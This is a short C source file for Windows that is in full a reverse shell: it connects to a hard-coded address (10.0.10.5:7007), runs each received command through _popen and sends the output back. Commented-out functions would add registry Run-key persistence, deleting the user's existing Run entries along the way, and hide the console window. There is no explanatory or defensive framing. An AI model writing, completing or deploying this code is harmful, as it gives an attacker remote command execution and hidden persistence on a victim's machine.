#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>


#define bzero(buffer, size) memset(buffer, 0, size)


void Shell(int sock);
// void persistence();
// void hideWINDOW();


int main(){

    //hideWINDOW();

    struct sockaddr_in ServerAdd;
    unsigned short Port = 7007;
    char *ServerIP = "10.0.10.5";

    WSADATA wsa;
	
	if (WSAStartup(MAKEWORD(2,0), &wsa) != 0)
	{
		return 1;
	}
 
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (!sock){
        printf("SOCKET ERROR!");
        return 1;
    }

    ServerAdd.sin_family = AF_INET;
    ServerAdd.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAdd.sin_port = htons(Port);

    connect(sock, (struct sockaddr *) &ServerAdd, sizeof(ServerAdd));

    Shell(sock);

    return 0;
}



void Shell(int sock){

    char RecvCMD[1024];
    char SendCMD[1048576];
    char container[1024];

    while(1){
        bzero(&RecvCMD, sizeof(RecvCMD));
        bzero(&SendCMD, sizeof(SendCMD));
        bzero(&container, sizeof(container));

        recv(sock, RecvCMD, sizeof(RecvCMD), 0);

        if (!strcmp(RecvCMD, "quit")){
            WSACleanup();
            closesocket(sock);
            break;
        }

        FILE *fd;
        fd = _popen(RecvCMD, "r");

        while (fgets(container, sizeof(container), fd)){
            strcat(SendCMD, container);
        }
        
        send(sock, SendCMD, sizeof(SendCMD), 0);
    }
}



// void persistence(){
//     int delPER = system("reg delete /f \"HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENT VERSION\\RUN\"");
//     int addPER = system("reg add \"HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENT VERSION\\RUN\" /t REG_SZ /v SYS32")
// }


// void hideWINDOW(){
//     HWND hide;
//     AllocConsole();
//     hide = FindWindow("ConsoleWindowClass", NULL);
//     ShowWindow(hide, 0);
// }